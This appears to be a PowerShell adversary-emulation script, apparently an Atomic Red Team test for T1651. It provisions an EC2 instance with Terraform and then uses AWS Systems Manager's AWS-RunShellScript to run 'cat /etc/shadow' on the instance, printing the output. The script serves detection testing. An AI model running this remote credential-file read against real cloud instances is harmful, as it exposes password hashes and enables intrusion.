Import-Module AWSPowerShell

function Set-AWSAuthentication {
    param (
        [string]$AccessKey,
        [string]$SecretKey,
        [string]$SessionToken,
        [string]$AWSProfile,
        [string]$AWSRegion
    )
    if ($SessionToken -eq "" -and $AWSProfile -eq "") {
        Set-AWSCredential -AccessKey $AccessKey -SecretKey $SecretKey -StoreAs "T1651-1"
    }
    elseif ($SessionToken -ne "" -and $AWSProfile -ne "") {
        Set-AWSCredential -AccessKey $AccessKey -SecretKey $SecretKey -SessionToken $SessionToken  -StoreAs "T1651-1" 
    }
    elseif ($AWSProfile -ne "") {
        Set-AWSCredential -ProfileName $AWSProfile -StoreAs "T1651-1"
    }

    try {
        Get-STSCallerIdentity -ProfileName "T1651-1" | Out-Null
    }
    catch {
        Write-Host "ERROR: Failed to authenticate to AWS. Please check your credentials and try again."
        exit 1
    }
    Set-DefaultAWSRegion -Region $AWSRegion
}

function Invoke-Terraform {
    param (
        [string]$TerraformCommand,
        [string]$TerraformDirectory,
        [string[]]$TerraformVariables
    )

    $currentPath = Resolve-Path .

    if (-not (Test-Path $TerraformDirectory)) {
        Write-Host "ERROR: Terraform directory not found. Please check the path and try again."
        exit 1
    }

    if (-not (Get-ChildItem $TerraformDirectory -Filter "*.tf")) {
        Write-Host "ERROR: No Terraform files found in the directory. Please check the path and try again."
        exit 1
    }

    foreach($variable in $TerraformVariables) {
        $varName = $variable.Split("=")[0]
        $varValue = $variable.Split("=")[1]
        [Environment]::SetEnvironmentVariable("TF_VAR_$varName", $varValue, "Process")
    }

    Set-Location $TerraformDirectory

    if ($TerraformCommand -eq "init") {
        try {
            terraform init | Out-Null
        }
        catch {
            Write-Host "ERROR: Failed to initialize Terraform. Please check the error message and try again."
            exit 1
        }
    } elseif ($TerraformCommand -eq "apply") {
        try {
            terraform apply -auto-approve | Out-Null
        }
        catch {
            Write-Host "ERROR: Failed to apply Terraform. Please check the error message and try again."
            exit 1
        }
    } elseif ($TerraformCommand -eq "destroy") {
        try {
            terraform destroy -auto-approve | Out-Null
        }
        catch {
            Write-Host "ERROR: Failed to destroy Terraform. Please check the error message and try again."
            exit 1
        }
    } else {
        Write-Host "ERROR: Invalid Terraform command. Please use 'init', 'apply', or 'destroy'."
        exit 1
    }

    Set-Location $currentPath
}

function Invoke-SSMAttack {
    param (
        [string]$AWSProfile,
        [string]$TerraformDirectory
    )
    $currentPath = Resolve-Path .
    Set-Location $TerraformDirectory
    $instanceId = (terraform output -json | ConvertFrom-Json | Select-Object -ExpandProperty aws_ec2_instance_id).value
    Set-Location $currentPath
    foreach($i in 1..50) {
        $instanceStatus = (Get-SSMInstanceAssociationsStatus -InstanceId $instanceId -ProfileName $AWSProfile).Status
        if ($instanceStatus -eq "Success") {
            break
        }
        Start-Sleep -Seconds 6
    }
    $commandId = (Send-SSMCommand -DocumentName "AWS-RunShellScript" -Target @{Key="tag:AtomicTest";Values=@("T1651-1")} -Comment "Atomic Test T1651-1" -Parameters @{commands = @("cat /etc/shadow")}).CommandId
    foreach ($i in 1..50) {
        $commandStatus = (Get-SSMCommandInvocation -CommandId $commandId -ProfileName $AWSProfile).Status
        if ($commandStatus -eq "Success") {
            $instanceId = (Get-SSMCommandInvocation -CommandId $commandId)[0].InstanceId
            $output = (Get-SSMCommandInvocationDetail -CommandId $commandId -InstanceId $instanceId).StandardOutputContent
            break
        }
        elseif ($commandStatus -eq "Failed") {
            Write-Host "ERROR: Failed to execute the SSM command. Please check the error message and try again."
            exit 1
        }
        Start-Sleep -Seconds 6
    }
    if ($output -eq "") {
        Write-Host "ERROR: No output received from the SSM command. Please check the error message and try again."
        exit 1
    }
    Write-Host "SSM Command Output:"
    Write-Host $output
}
